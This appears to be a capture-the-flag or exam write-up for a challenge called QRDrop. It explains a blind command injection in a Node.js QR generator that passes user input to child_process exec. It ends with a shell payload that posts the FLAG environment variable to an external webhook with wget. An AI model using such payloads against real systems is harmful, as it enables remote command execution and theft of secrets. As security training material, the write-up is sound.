### QRDrop - Command Injection

> x Exam (27)

#### Node.js Execution Sinks and Blind Environment Exfiltration

The transition to a JavaScript backend introduces a different set of execution sinks, specifically within the `child_process` module. The provided source code implements a QR code generator utilizing the `exec` function to invoke the system-level `qrencode` utility. The vulnerability manifests through the direct concatenation of the user-supplied `url` variable into the execution string. While the developer attempted to encapsulate the input within single quotes, the absence of robust input sanitization allows the injection of shell metacharacters to escape the intended string context.

A critical architectural observation involves the handling of the command output and the application state. The application suppresses the standard output and error streams, rendering the vulnerability entirely blind. Furthermore, the objective artifact is located within the system environment, as the script initializes the `FLAG` constant directly from the `process.env.FLAG` variable. Because the `exec` function spawns a subshell that inherently inherits the parent Node.js process environment, the target secret remains fully accessible to executed shell commands via the `$FLAG` variable, dictating an out-of-band network exfiltration strategy.

To construct a successful payload, the initial single quote must be prematurely terminated. Following the closure, a command separator such as a semicolon initiates the secondary execution context. The exfiltration command leverages native network utilities like `curl` to transmit the environment variable to an external listener, subsequently utilizing a secondary quote to gracefully neutralize the remainder of the original command string.


```Bash
; wget --post-data="$FLAG" https://webhook.site/YOUR-UUID; echo 
```


![](_attachments/QRDrop%20-%20Command%20Injection.png)


